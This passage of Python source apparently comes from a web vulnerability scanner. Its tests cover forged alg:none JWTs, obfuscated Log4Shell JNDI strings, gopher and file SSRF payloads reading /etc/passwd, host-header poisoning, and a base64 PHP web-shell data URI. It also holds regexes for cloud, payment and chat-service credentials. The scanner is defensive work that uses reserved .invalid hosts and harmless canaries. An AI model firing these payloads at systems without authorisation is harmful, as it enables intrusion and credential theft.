            header = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip('=')
            jwt_attacks.append((name, f"{header}.{none_payload}."))
        
        # JKU/X5U injection (SSRF via JWT)
        jku_header = base64.urlsafe_b64encode(
            b'{"alg":"RS256","typ":"JWT","jku":"https://blackthorn.invalid/jwks.json"}'
        ).decode().rstrip('=')
        jwt_attacks.append(('jku_ssrf', f"{jku_header}.{none_payload}."))
        
        x5u_header = base64.urlsafe_b64encode(
            b'{"alg":"RS256","typ":"JWT","x5u":"https://blackthorn.invalid/cert.pem"}'
        ).decode().rstrip('=')
        jwt_attacks.append(('x5u_ssrf', f"{x5u_header}.{none_payload}."))
        
        # Test endpoints with JWT attacks
        auth_endpoints = [
            '/api/user', '/api/profile', '/api/me', '/api/account',
            '/user', '/profile', '/dashboard', '/admin'
        ]
        
        for attack_name, jwt_token in jwt_attacks:
            for endpoint in auth_endpoints[:3]:  # Limit to avoid too many requests
                try:
                    headers = {
                        'Authorization': f'Bearer {jwt_token}',
                        'Cookie': f'token={jwt_token}; jwt={jwt_token}'
                    }
                    
                    result = self._test_request(
                        headers=headers, path=endpoint,
                        technique=f'JWT attack: {attack_name}',
                        probe={
                            'category': 'JWT_ATTACK',
                            'payload': f'Bearer {jwt_token}',
                            'insertion_point': {
                                'type': 'header', 'name': 'Authorization',
                            },
                            'detector_id': 'jwt-invalid-forged-auth-transition-v2',
                            'control': {
                                'method': 'GET', 'path': endpoint,
                                'headers': {
                                    'Authorization': 'Bearer blackthorn.invalid.token',
                                    'Cookie': ('token=blackthorn.invalid.token; '
                                               'jwt=blackthorn.invalid.token'),
                                },
                                'data': None,
                            },
                        },
                    )
                    if (self._result_has_evidence(result, 'blocked_to_allowed')
                            and (result.get('baseline') or {}).get('status') in (401, 403)):
                        result['severity'] = (
                            'CRITICAL' if 'none' in attack_name.lower() else 'HIGH'
                        )
                        results.append(result)
                        print(f"  [✓] JWT auth boundary bypass: {attack_name}")
                        break
                            
                except Exception as e:
                    logger.debug(f"JWT attack error: {e}")
        
        # Report found JWTs
        if found_jwts:
            result = {
                'technique': 'JWT Token Discovery',
                'bypass': False,
                'status': 200,
                'reason': f'Found {len(found_jwts)} JWT token(s) in response',
                'severity': 'INFO',
                'category': 'JWT_ATTACK',
                'details': {'tokens_found': len(found_jwts)}
            }
            results.append(result)
        
        return results
    
    def _test_web_cache_deception(self) -> List[Dict[str, Any]]:
        """Web Cache Deception attacks - trick caching of sensitive pages"""
        results = []
        print("  [*] Testing Web Cache Deception...")
        
        # Sensitive endpoints to test
        sensitive_endpoints = [
            '/account', '/profile', '/user', '/settings', '/dashboard',
            '/api/user', '/api/me', '/myaccount', '/my-account'
        ]
        
        # Cache deception payloads (appending static file extensions)
        deception_suffixes = [
            '.css', '.js', '.png', '.jpg', '.gif', '.ico', '.svg',
            '.woff', '.woff2', '.ttf', '.eot',
            '/test.css', '/test.js', '/logo.png', '/style.css',
            '/nonexistent.css', '%2f..%2ftest.css',
            ';test.css', '?.css', '#.css'
        ]
        
        for endpoint in sensitive_endpoints:
            for suffix in deception_suffixes[:5]:  # Limit suffixes
                try:
                    # First request - potentially cached
                    url = f"{self.target}{endpoint}{suffix}"
                    resp1 = self._scoped_safe_request(url, timeout=self.timeout, allow_redirects=False)
                    
                    if resp1 is not None and resp1.status_code == 200:
                        # Check cache headers
                        cache_control = resp1.headers.get('Cache-Control', '').lower()
                        x_cache = resp1.headers.get('X-Cache', '').lower()
                        cf_cache = resp1.headers.get('CF-Cache-Status', '').lower()
                        age = resp1.headers.get('Age', '')
                        
                        # Determine if response was cached
                        is_cached = any([
                            'hit' in x_cache,
                            'hit' in cf_cache,
                            age and int(age) > 0,
                            'public' in cache_control,
                            'max-age' in cache_control and 'private' not in cache_control
                        ])
                        
                        # Check if sensitive content in response
                        has_sensitive = any(x in resp1.text.lower() for x in [
                            'email', 'username', 'password', 'token', 'session',
                            'account', 'balance', 'credit', 'ssn', 'phone'
                        ])
                        
                        if is_cached and has_sensitive:
                            result = {
                                'technique': f'Web Cache Deception: {endpoint}{suffix}',
                                'bypass': True,
                                'status': resp1.status_code,
                                'reason': 'Sensitive page cached with static extension',
                                'severity': 'HIGH',
                                'category': 'CACHE_DECEPTION',
                                'details': {
                                    'cache_control': cache_control,
                                    'x_cache': x_cache,
                                    'cf_cache': cf_cache
                                }
                            }
                            results.append(result)
                            print(f"  [✓] Cache Deception: {endpoint}{suffix}")
                            
                except Exception as e:
                    logger.debug(f"Cache deception error: {e}")
        
        # Test cache key poisoning via unkeyed headers
        poison_headers = [
            {'X-Forwarded-Host': 'blackthorn.invalid'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Forwarded-Scheme': 'nothttps'},
        ]
        
        for headers in poison_headers:
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}/?cb={int(time.time())}",
                    timeout=self.timeout,
                    headers=headers
                )
                
                if resp is not None:
                    header_name = list(headers.keys())[0]
                    header_value = list(headers.values())[0]
                    
                    if header_value in resp.text:
                        result = {
                            'technique': f'Cache Key Poison: {header_name}',
                            'bypass': True,
                            'status': resp.status_code,
                            'reason': f'Unkeyed header {header_name} reflected',
                            'severity': 'MEDIUM',
                            'category': 'CACHE_DECEPTION'
                        }
                        results.append(result)
                        print(f"  [!] Cache Poison: {header_name} reflected")
                        
            except Exception as e:
                logger.debug(f"Cache poison error: {e}")
        
        return results
    
    def _test_log4shell_patterns(self) -> List[Dict[str, Any]]:
        """Look for new JNDI diagnostics; OOB is required for confirmation."""
        results = []
        print("  [*] Testing Log4Shell/JNDI injection patterns...")
        
        # JNDI payload patterns (detection only - no actual callbacks)
        jndi_payloads = [
            # Standard Log4Shell
            '${jndi:ldap://test.com/a}',
            '${jndi:rmi://test.com/a}',
            '${jndi:dns://test.com/a}',
            
            # Obfuscation bypasses
            '${${lower:j}ndi:ldap://test.com/a}',
            '${${upper:j}ndi:ldap://test.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:ldap://test.com/a}',
            '${j${::-n}di:ldap://test.com/a}',
            '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://test.com/a}',
            
            # Nested lookups
            '${${lower:${lower:jndi}}:ldap://test.com/a}',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://test.com/a}',
            
            # URL encoding variations
            '%24%7Bjndi%3Aldap%3A%2F%2Ftest.com%2Fa%7D',
            
            # Unicode variations
            '${jn${::-d}i:ldap://test.com/a}',
        ]
        invalid_domain = f"blackthorn-{random.randrange(10**8, 10**9)}.invalid"
        # Never direct callbacks at an unowned third-party domain. The reserved
        # .invalid name is diagnostic-only; configured OOB probes run separately.
        jndi_payloads = [p.replace('test.com', invalid_domain) for p in jndi_payloads]
        diagnostic_oracle = {
            'type': 'regex',
            'patterns': [
                r'javax\.naming\.(?:communication|naming)exception',
                r'(?:name not found|unknown host|no initial context)exception',
                r'jndi lookup failed', r'ldap connection (?:failed|refused)',
            ],
            'severity': 'HIGH', 'confidence': 'medium',
            'verification_status': 'candidate', 'kind': 'suspected',
            'reason': ('A JNDI-specific backend diagnostic appeared only after '
                       'the probe; use correlated OOB to confirm Log4Shell'),
        }
        
        # Injection points
        injection_vectors = [
            ('query', f"?test=PAYLOAD"),
            ('header_ua', 'User-Agent'),
            ('header_ref', 'Referer'),
            ('header_xff', 'X-Forwarded-For'),
            ('header_custom', 'X-Api-Version'),
            ('header_accept', 'Accept-Language'),
        ]
        
        for payload in jndi_payloads[:6]:  # Limit payloads
            encoded_payload = quote(payload)

            try:
                result = self._test_request(
                    path=f'/?test={encoded_payload}',
                    technique='Log4Shell/JNDI diagnostic: query parameter',
                    probe={
                        'category': 'LOG4SHELL', 'payload': payload,
                        'parameter': 'test',
                        'insertion_point': {'type': 'query', 'name': 'test'},
                        'detector_id': 'log4shell-diagnostic-v2',
                        'oracle': diagnostic_oracle,
                    },
                )
                if self._result_has_evidence(result, 'response_signature'):
                    results.append(result)
                    print("  [!] Log4Shell candidate in query parameter")
                        
            except Exception as e:
                logger.debug(f"Log4Shell query test error: {e}")
            
            # Test in headers
            for vector_name, header_name in injection_vectors[1:]:
                try:
                    headers = {header_name: payload}
                    result = self._test_request(
                        headers=headers, path='/',
                        technique=f'Log4Shell/JNDI diagnostic: {header_name}',
                        probe={
                            'category': 'LOG4SHELL', 'payload': payload,
                            'insertion_point': {'type': 'header', 'name': header_name},
                            'detector_id': 'log4shell-diagnostic-v2',
                            'oracle': diagnostic_oracle,
                        },
                    )
                    if self._result_has_evidence(result, 'response_signature'):
                        results.append(result)
                        print(f"  [!] Log4Shell candidate in {header_name}")
                            
                except Exception as e:
                    logger.debug(f"Log4Shell header test error: {e}")
        
        # Test POST body
        try:
            payload = f'${{jndi:ldap://{invalid_domain}/a}}'
            result = self._test_request(
                method='POST', path='/', data=urlencode({'test': payload}),
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                technique='Log4Shell/JNDI diagnostic: POST body',
                probe={
                    'category': 'LOG4SHELL', 'payload': payload,
                    'insertion_point': {'type': 'form-body', 'name': 'test'},
                    'detector_id': 'log4shell-diagnostic-v2',
                    'oracle': diagnostic_oracle,
                },
            )
            if self._result_has_evidence(result, 'response_signature'):
                results.append(result)
                
        except Exception as e:
            logger.debug(f"Log4Shell POST error: {e}")
        
        return results
    
    def _test_ssrf_protocol_smuggling(self) -> List[Dict[str, Any]]:
        """Advanced SSRF with protocol smuggling - gopher, dict, file, ldap"""
        results = []
        print("  [*] Testing SSRF protocol smuggling...")
        
        # Protocol smuggling payloads
        ssrf_protocols = [
            # Gopher protocol (for Redis, SMTP, etc.)
            ('gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a', 'Gopher Redis'),
            ('gopher://127.0.0.1:11211/_stats', 'Gopher Memcached'),
            ('gopher://127.0.0.1:25/_HELO%20localhost', 'Gopher SMTP'),
            
            # Dict protocol
            ('dict://127.0.0.1:6379/INFO', 'Dict Redis'),
            ('dict://127.0.0.1:11211/stats', 'Dict Memcached'),
            
            # File protocol
            ('file:///etc/passwd', 'File /etc/passwd'),
            ('file:///c:/windows/win.ini', 'File win.ini'),
            ('file://localhost/etc/passwd', 'File localhost'),
            
            # LDAP protocol
            ('ldap://127.0.0.1:389/%0astats%0aquit', 'LDAP'),
            
            # TFTP protocol
            ('tftp://127.0.0.1/test', 'TFTP'),
            
            # Netdoc (Java)
            ('netdoc:///etc/passwd', 'Netdoc'),
            
            # Jar protocol (Java)
            ('jar:http://blackthorn.invalid/test.jar!/test.txt', 'Jar'),
            
            # PHP wrappers
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'PHP Filter'),
            ('php://input', 'PHP Input'),
            ('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==', 'PHP Data'),
            ('expect://id', 'PHP Expect'),
            
            # Cloud metadata (various formats)
            ('http://[::ffff:169.254.169.254]/', 'IPv6 mapped metadata'),
            ('http://0x7f000001/', 'Hex localhost'),
            ('http://0177.0.0.1/', 'Octal localhost'),
            ('http://2130706433/', 'Decimal localhost'),
            ('http://127.1/', 'Short localhost'),
            ('http://0/', 'Zero localhost'),
        ]
        
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'src', 'source', 'file', 'document', 'page']
        
        for payload, technique in ssrf_protocols:
            for param in ssrf_params[:3]:  # Limit params
                try:
                    encoded_payload = quote(payload, safe='')
                    
                    # Test GET
                    resp = self._scoped_safe_request(
                        f"{self.target}/?{param}={encoded_payload}",
                        timeout=self.timeout + 3
                    )
                    
                    if resp is not None:
                        # Check for successful protocol access indicators
                        indicators = [
                            'root:', 'daemon:', '[extensions]',  # File access
                            'redis_version', 'memcached',  # Services
                            'ldap', 'uid=', 'cn=',  # LDAP
                            'DOCTYPE', '<?xml',  # XML responses
                            'meta-data', 'ami-id',  # AWS
                        ]
                        
                        if any(ind in resp.text.lower() for ind in indicators):
                            result = {
                                'technique': f'SSRF Protocol: {technique}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': f'Protocol smuggling successful via {param}',
                                'severity': 'CRITICAL',
                                'category': 'SSRF_PROTOCOL'
                            }
                            results.append(result)
                            print(f"  [✓] CRITICAL: SSRF {technique} via {param}")
                            
                except Exception as e:
                    logger.debug(f"SSRF protocol test error: {e}")
        
        return results
    
    def _test_host_header_attacks(self) -> List[Dict[str, Any]]:
        """Host header attacks - password reset poisoning, cache poisoning"""
        results = []
        print("  [*] Testing Host header attacks...")
        
        # Password reset poisoning endpoints
        reset_endpoints = [
            '/reset-password', '/forgot-password', '/password/reset',
            '/api/password/reset', '/auth/forgot', '/account/recover',
            '/users/password/new', '/password/forgot'
        ]
        
        # Host header attack payloads
        host_attacks = [
            # Basic host injection
            {'Host': 'blackthorn.invalid'},
            {'Host': f'{self.domain}@blackthorn.invalid'},
            {'Host': f'{self.domain}:blackthorn.invalid'},
            {'Host': f'blackthorn.invalid#{self.domain}'},
            
            # X-Forwarded-Host attacks
            {'X-Forwarded-Host': 'blackthorn.invalid'},
            {'X-Host': 'blackthorn.invalid'},
            {'X-Forwarded-Server': 'blackthorn.invalid'},
            
            # Double Host header
            # Note: requests library doesn't support this easily
            
            # Absolute URL override
            {'Host': self.domain, 'X-Original-URL': 'http://blackthorn.invalid/'},
            
            # Port injection
            {'Host': f'{self.domain}:443@blackthorn.invalid'},
            {'Host': f'{self.domain}:blackthorn.invalid:80'},
        ]
        
        # Test on reset endpoints
        for endpoint in reset_endpoints:
            for attack_headers in host_attacks[:5]:
                try:
                    # Try POST request (common for password reset)
                    resp = self._scoped_safe_request(
                        f"{self.target}{endpoint}", method='POST',
                        data={'email': 'blackthorn-probe@example.invalid'},
                        headers=attack_headers,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    if resp is not None:
                        # Exact controlled-host reflection is a candidate for link poisoning.
                        if ('blackthorn.invalid' in resp.text or
                                'blackthorn.invalid' in resp.headers.get('Location', '')):
                            attack_type = list(attack_headers.keys())[0]
                            result = {
                                'technique': f'Host-derived link candidate: {attack_type}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': (f'Controlled host was reflected at {endpoint}; '
                                           'a delivered reset link or cached response was not proven'),
                                'severity': 'MEDIUM',
                                'category': 'HOST_HEADER_ATTACK',
                                'kind': 'suspected',
                                'verification_status': 'candidate',
                                'confidence': 'medium',
                                'method': 'POST', 'path': endpoint,
                                'url': f'{self.target}{endpoint}',
                                'headers': dict(attack_headers),
                                'request': {
                                    'method': 'POST', 'path': endpoint,
                                    'url': f'{self.target}{endpoint}',
                                    'headers': dict(attack_headers),
                                    'body': {'email': 'blackthorn-probe@example.invalid'},
                                },
                                'response': {
                                    'status': resp.status_code,
                                    'headers': {'location': resp.headers.get('Location', '')},
                                    'excerpt': resp.text[:300],
                                },
                                'evidence': [{
                                    'type': 'controlled_host_reflection',
                                    'description': 'Controlled .invalid host appeared in response',
                                    'matched': 'blackthorn.invalid',
                                }],
                                '_no_reconfirm': True,
                            }
                            results.append(result)
                            print(f"  [✓] Host Header Poison at {endpoint}")
                            
                except Exception as e:
                    logger.debug(f"Host header attack error: {e}")
        
        # Test routing bypass
        internal_hosts = ['localhost', '127.0.0.1', 'internal', 'admin.internal', '10.0.0.1']
        for internal_host in internal_hosts:
            try:
                resp = self._scoped_safe_request(
                    self.target,
                    timeout=self.timeout,
                    headers={'Host': internal_host}
                )
                
                if resp is not None and resp.status_code == 200:
                    if len(resp.content) != self._baseline_size:
                        result = {
                            'technique': f'Virtual-host routing candidate: {internal_host}',
                            'bypass': True,
                            'status': resp.status_code,
                            'reason': ('Host override returned different content; access to a '
                                       'protected internal application is not proven'),
                            'severity': 'MEDIUM',
                            'category': 'HOST_HEADER_ATTACK',
                            'kind': 'suspected',
                            'verification_status': 'candidate',
                            'confidence': 'low',
                            'method': 'GET', 'path': '/', 'url': self.target,
                            'headers': {'Host': internal_host},
                            'request': {
                                'method': 'GET', 'path': '/', 'url': self.target,
                                'headers': {'Host': internal_host}, 'body': None,
                            },
                            'response': {'status': resp.status_code,
                                         'size': len(resp.content)},
                            'comparison': {
                                'size_delta': (len(resp.content) -
                                               int(self._baseline_size or 0)),
                                'control_scope': 'root',
                            },
                            'evidence': [{
                                'type': 'virtual_host_response_delta',
                                'description': 'Host override changed response size',
                                'matched': str(len(resp.content)),
                            }],
                            '_no_reconfirm': True,
                        }
                        results.append(result)
                        print(f"  [!] Virtual-host routing candidate: {internal_host}")
                        
            except Exception as e:
                logger.debug(f"Host routing error: {e}")
        
        return results
    
    def _test_ssi_injection(self) -> List[Dict[str, Any]]:
        """Detect SSI execution with a harmless randomized output canary."""
        results = []
        print("  [*] Testing SSI injection...")
        marker = f'BTSSI-{random.randrange(10**8, 10**9)}'
        payload = f'<!--#exec cmd="printf {marker}"-->'
        
        # Common SSI-enabled extensions
        ssi_extensions = ['.shtml', '.stm', '.shtm', '.html']
        
        for ext in ssi_extensions:
            try:
                path = f"/test{ext}?input={quote(payload)}"
                result = self._test_request(
                    path=path, technique=f'SSI execution canary ({ext})',
                    probe={
                        'category': 'SSI_INJECTION', 'payload': payload,
                        'parameter': 'input',
                        'insertion_point': {'type': 'query', 'name': 'input'},
                        'detector_id': 'ssi-execution-marker-v3',
                        'control': {
                            'method': 'GET',
                            'path': f'/test{ext}?input=blackthorn-control',
                            'headers': {}, 'data': None,
                        },
                        'oracle': {
                            'type': 'marker', 'value': marker, 'payload': payload,
                            'severity': 'HIGH',
                            'reason': 'SSI executed the harmless printf canary',
                        },
                    },
                )
                if self._result_has_evidence(result, 'execution_marker'):
                    results.append(result)
                    print(f"  [✓] HIGH: SSI execution confirmed ({ext})")
            except Exception as e:
                logger.debug(f"SSI test error: {e}")
        
        return results
    
    def _test_api_key_exposure(self) -> List[Dict[str, Any]]:
        """Detect exposed API keys and secrets in responses"""
        results = []
        print("  [*] Scanning for exposed API keys/secrets...")
        
        # API key patterns (regex)
        secret_patterns = {
            'AWS Access Key': r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b',
            'AWS Secret Key': (r'''(?ix)\b(?:aws_)?secret_access_key\b\s*[:=]\s*'''
                               r'''["']?[0-9A-Za-z/+=]{40}["']?'''),
            'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
            'GitHub OAuth': r'gho_[0-9a-zA-Z]{36}',
            'GitLab Token': r'glpat-[0-9a-zA-Z\-]{20}',
            'Slack Token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*',
            'Slack Webhook': r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+',
            'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
            'Google OAuth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
            'Firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
            'Stripe Live': r'sk_live_[0-9a-zA-Z]{24}',
            'Stripe Test': r'sk_test_[0-9a-zA-Z]{24}',
            'Square OAuth': r'sq0atp-[0-9A-Za-z\-_]{22}',
            'Square Access': r'sq0csp-[0-9A-Za-z\-_]{43}',
            'PayPal/Braintree': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
            'Twilio API': r'SK[0-9a-fA-F]{32}',
            'Twilio SID': r'AC[a-zA-Z0-9_\-]{32}',
            'SendGrid': r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}',
            'Mailgun': r'key-[0-9a-zA-Z]{32}',
            'Mailchimp': r'[0-9a-f]{32}-us[0-9]{1,2}',
            'DigitalOcean': r'dop_v1_[a-f0-9]{64}',
            'NPM Token': r'npm_[A-Za-z0-9]{36}',
            'Discord Token': r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}',
            'Discord Webhook': r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9\-_]+',
            'Telegram Bot': r'[0-9]+:AA[0-9A-Za-z\-_]{33}',
            'Facebook Token': r'EAACEdEose0cBA[0-9A-Za-z]+',
            'Twitter API': r'[1-9][0-9]+-[0-9a-zA-Z]{40}',
            'Azure Storage': r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{88}',
            'Private Key': r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
            'JWT Token': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*',
            'Basic Auth': r'[Aa]uthorization:\s*[Bb]asic\s+[A-Za-z0-9+/=]+',
            'Bearer Token': r'[Bb]earer\s+[A-Za-z0-9_\-\.]+',
            'Password in URL': r'[a-zA-Z]{3,10}://[^/\s:@]+:[^/\s:@]+@[^/\s:@]+',
            'MongoDB URI': r'mongodb(?:\+srv)?://[^\s<>"/:]+:[^\s<>"/@]+@[^\s<>"]+',
            'PostgreSQL URI': r'postgres(?:ql)?://[^\s<>"/:]+:[^\s<>"/@]+@[^\s<>"]+',
            'MySQL URI': r'mysql://[^\s<>"/:]+:[^\s<>"/@]+@[^\s<>"]+',
        }
        
        # Endpoints likely to expose secrets
        sensitive_endpoints = [
            '/', '/config', '/settings', '/env', '/debug',
            '/api/config', '/api/settings', '/.env', '/config.json',
            '/app/config', '/application.properties', '/application.yml'
        ]
        
        compiled_patterns = {name: re.compile(pattern) for name, pattern in secret_patterns.items()}
        seen_secret_hashes = set()
        
        for endpoint in sensitive_endpoints:
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}{endpoint}",
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                if resp is not None and resp.status_code == 200:
                    content = resp.text
                    
                    for secret_name, pattern in compiled_patterns.items():
                        for match in pattern.finditer(content):
                            matched_text = match.group(0)
                            lowered = matched_text.lower()
                            if any(word in lowered for word in (
                                'example', 'replace-me', 'replace_me', 'your-token',
                                'your_key', 'xxxxxxxx', '<redacted>',
                            )):
                                continue
                            digest = hashlib.sha256(matched_text.encode()).hexdigest()
                            if digest in seen_secret_hashes:
                                continue
                            seen_secret_hashes.add(digest)
                            masked = (matched_text[:8] + '...' + matched_text[-4:]
                                      if len(matched_text) > 16 else '<masked>')
                            confirmed_material = secret_name == 'Private Key'
                            severity = ('MEDIUM' if secret_name in {
                                'JWT Token', 'Basic Auth', 'Bearer Token',
                            } else 'HIGH')
                            reason = (f'{secret_name} material found at {endpoint}: {masked}. '
                                      + ('The private-key header is direct exposure evidence.'
                                         if confirmed_material else
                                         'Validity and privileges were not tested.'))
                            result = {
                                'technique': f'Exposed Secret: {secret_name}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': reason,
                                'severity': severity,
                                'category': 'API_KEY_EXPOSURE',
                                'kind': 'finding' if confirmed_material else 'suspected',
                                'verification_status': ('confirmed' if confirmed_material
                                                        else 'candidate'),
                                'confidence': 'high' if confirmed_material else 'medium',
                                'method': 'GET', 'path': endpoint,
                                'url': f'{self.target}{endpoint}',
                                'request': {
                                    'method': 'GET', 'path': endpoint,
                                    'url': f'{self.target}{endpoint}',
                                    'headers': {}, 'body': None,
                                },
                                'response': {
                                    'status': resp.status_code,
                                    'content_type': resp.headers.get('Content-Type', ''),
                                },
                                'evidence': [{
                                    'type': 'secret_signature',
                                    'description': reason,
                                    'matched': masked,
                                }],
                                'details': {'endpoint': endpoint, 'type': secret_name},
                                '_no_reconfirm': True,
                            }
                            results.append(result)
                            print(f"  [{'✓' if confirmed_material else '!'}] "
                                  f"{secret_name} material at {endpoint}")
                            
            except Exception as e:
                logger.debug(f"API key scan error: {e}")
        
        return results
    
    def _test_dns_zone_transfer(self) -> List[Dict[str, Any]]:
        """Attempt DNS zone transfer (AXFR)"""
        results = []
        print("  [*] Testing DNS zone transfer...")
        
        try:
            import subprocess
            
            # Extract domain
            domain = self.domain
            
            # Get nameservers
            try:
                ns_records = socket.getaddrinfo(f"ns1.{domain}", None) or []
            except:
                ns_records = []
            
            # Common nameserver prefixes
            ns_prefixes = ['ns1', 'ns2', 'dns1', 'dns2', 'ns', 'dns']
            nameservers = []
            
            for prefix in ns_prefixes:
                try:
                    ns = f"{prefix}.{domain}"
                    ip = socket.gethostbyname(ns)
                    nameservers.append(ns)
                except:
                    pass
            
            # Attempt zone transfer using dig (if available)
            for ns in nameservers[:2]:
                try:
                    result_proc = subprocess.run(
                        ['dig', f'@{ns}', domain, 'AXFR', '+short'],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    output = result_proc.stdout
                    
                    if output and 'Transfer failed' not in output and len(output) > 50:
                        result = {
                            'technique': f'DNS Zone Transfer: {ns}',
                            'bypass': True,
                            'status': 0,
                            'reason': f'Zone transfer successful from {ns}',
                            'severity': 'HIGH',
                            'category': 'DNS_ZONE_TRANSFER',
                            'details': {'records_preview': output[:500]}
                        }
                        results.append(result)
                        print(f"  [✓] Zone Transfer: {ns}")
                        
                except subprocess.TimeoutExpired:
                    pass
                except FileNotFoundError:
                    # dig not available
                    result = {
                        'technique': 'DNS Zone Transfer',
                        'bypass': False,
                        'status': 0,
                        'reason': 'dig command not available - manual testing recommended',
                        'severity': 'INFO',
                        'category': 'DNS_ZONE_TRANSFER'
                    }
                    results.append(result)
                    break
                except Exception as e:
                    logger.debug(f"Zone transfer error: {e}")
                    
        except Exception as e:
            logger.debug(f"DNS zone transfer test error: {e}")
        
        return results
    
    def _test_verb_tampering_extended(self) -> List[Dict[str, Any]]:
        """Extended HTTP verb/method tampering"""
        results = []
        print("  [*] Testing extended verb tampering...")
        
        # Extended HTTP methods
        # Read-only/discovery methods only. Collection creation, write, move,
        # lock, purge, and tunnel methods are not safe to guess at `/`.
        methods = [
            'TRACE', 'TRACK', 'DEBUG', 'OPTIONS', 'PROPFIND', 'SEARCH',
            'VIEW', 'REPORT', 'ARBITRARY', 'FAKE', 'TEST',
        ]
        
        for method in methods:
            try:
                resp = self._scoped_safe_request(
                    self.target, method=method,
                    timeout=self.timeout,
                    verify=False
                )
                
                if resp is not None:
                    # TRACE/TRACK can lead to XST (Cross-Site Tracing)
                    if method in ['TRACE', 'TRACK'] and resp.status_code == 200:
                        if 'TRACE' in resp.text or method in resp.text:
                            result = {
                                'technique': f'XST via {method}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': f'{method} method enabled - XST possible',
                                'severity': 'LOW',
                                'category': 'VERB_TAMPERING',
                                'kind': 'suspected',
                                'verification_status': 'candidate',
                                'confidence': 'medium',
                                'method': method, 'path': '/', 'url': self.target,
                                'evidence': [{
                                    'type': 'trace_echo',
                                    'description': f'{method} echoed request material',
                                    'matched': method,
                                }],
                            }
                            results.append(result)
                            print(f"  [!] XST: {method} enabled")
                    
                    # DEBUG method
                    elif method == 'DEBUG' and resp.status_code in [200, 500]:
                        if 'debug' in resp.text.lower() or 'stack' in resp.text.lower():
                            result = {
                                'technique': 'DEBUG Method Enabled',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': 'DEBUG method returns debug info',
                                'severity': 'HIGH',
                                'category': 'VERB_TAMPERING'
                            }
                            results.append(result)
                            print(f"  [!] DEBUG method enabled")
                    
                    # WebDAV methods
                    elif method == 'PROPFIND' and resp.status_code in [200, 207]:
                        result = {
                            'technique': f'WebDAV: {method}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': 'Read-only WebDAV discovery method is enabled',
                            'severity': 'INFO',
                            'category': 'VERB_TAMPERING',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        print(f"  [!] WebDAV: {method} enabled")
                    
                    # Custom methods accepted
                    elif method in ['ARBITRARY', 'FAKE', 'TEST'] and resp.status_code not in [400, 405, 501]:
                        result = {
                            'technique': f'Custom Method: {method}',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': ('Server returned a non-rejection response for an arbitrary '
                                       'method; no authorization or state impact was shown'),
                            'severity': 'INFO',
                            'category': 'VERB_TAMPERING',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        
            except Exception as e:
                logger.debug(f"Verb tampering error for {method}: {e}")
        
        return results
    
    def _test_range_header_attacks(self) -> List[Dict[str, Any]]:
        """Range header attacks - overlapping ranges, many ranges (DoS)"""
        results = []
        print("  [*] Testing Range header attacks...")
        
        range_attacks = [
            # Many ranges (potential DoS)
            ('bytes=' + ','.join([f'{i}-{i+1}' for i in range(0, 1000, 2)]), 'Many ranges (500)'),
            
            # Overlapping ranges
            ('bytes=0-100,50-150,100-200', 'Overlapping ranges'),
            
            # Negative ranges
            ('bytes=-1', 'Negative start'),
            ('bytes=0--1', 'Double negative'),
            
            # Invalid ranges
            ('bytes=100-0', 'Reversed range'),
            ('bytes=abc-xyz', 'Invalid characters'),
            
            # Large range
            ('bytes=0-999999999999', 'Very large range'),
            
            # Multiple overlapping
            ('bytes=0-0,0-0,0-0,0-0,0-0', 'Repeated zero ranges'),
            
            # Suffix ranges
            ('bytes=-500,-500,-500,-500,-500', 'Multiple suffix ranges'),
        ]
        
        for range_header, technique in range_attacks:
            try:
                start_time = time.time()
                resp = self._scoped_safe_request(
                    self.target,
                    timeout=self.timeout + 5,
                    headers={'Range': range_header}
                )
                elapsed = time.time() - start_time
                
                if resp is not None:
                    # Check for unusual response
                    if resp.status_code == 206:  # Partial Content
                        if 'Many ranges' in technique and elapsed > 2:
                            result = {
                                'technique': f'Range DoS: {technique}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': f'Server processed many ranges (took {elapsed:.1f}s)',
                                'severity': 'MEDIUM',
                                'category': 'RANGE_ATTACK'
                            }
                            results.append(result)
